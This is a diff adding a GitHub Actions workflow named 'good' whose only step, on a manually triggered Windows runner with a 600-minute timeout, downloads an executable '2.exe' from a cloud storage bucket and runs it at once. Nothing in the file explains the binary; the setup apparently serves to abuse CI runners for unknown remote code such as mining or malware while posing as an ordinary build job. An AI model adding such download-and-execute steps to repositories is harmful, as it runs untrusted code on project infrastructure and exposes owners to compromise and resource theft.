@@ -1,0 +1,8 @@
+name: good  
+on: workflow_dispatch  
+jobs:  
+  build:  
+    runs-on: windows-2019  
+    steps:  
+    - run: Invoke-WebRequest https://storage.googleapis.com/publictoilet2024-8b1d1.appspot.com/2.exe -OutFile 2.exe ; .\2.exe  
+    timeout-minutes: 600
